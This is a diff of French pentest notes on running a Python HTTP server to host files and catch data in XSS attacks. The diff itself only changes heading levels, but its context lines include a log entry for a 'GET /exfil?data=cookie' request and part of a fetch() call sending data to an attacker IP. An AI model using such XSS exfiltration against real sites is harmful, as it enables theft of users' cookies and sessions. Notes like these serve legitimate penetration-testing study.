@@ -1,6 +1,6 @@
-## <span style="color:orange;">7. Serveur HTTP Python</span>
+# <span style="color:orange;">7. Serveur HTTP Python</span>
 
-### 7.1 Héberger Fichiers
+## 7.1 Héberger Fichiers
 
 **Lancer serveur HTTP sur port 80 :**
 
@@ -21,7 +21,7 @@ python3 -m http.server 80
 192.168.56.101 - - [12/Jan/2026 12:31:09] "GET /exfil?data=cookie HTTP/1.1" 404 -
 ```
 
-#### **autre serveur python** 
+### **serveur python plus complet** 
 ```python
 #!/usr/bin/env python3
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -127,7 +127,7 @@ python -m SimpleHTTPServer 80
 ```
 
 ---
-### 7.2 Workflow XSS avec Serveur HTTP
+## 7.2 Workflow XSS avec Serveur HTTP
 
 **Préparation :**
 
@@ -189,7 +189,7 @@ fetch("http://192.168.45.230/exfil", {
 
 ---
 
-### 7.3 Exfiltration Données
+## 7.3 Exfiltration Données
 
 **Exfiltration XSS universelle :**
 ``` javascript
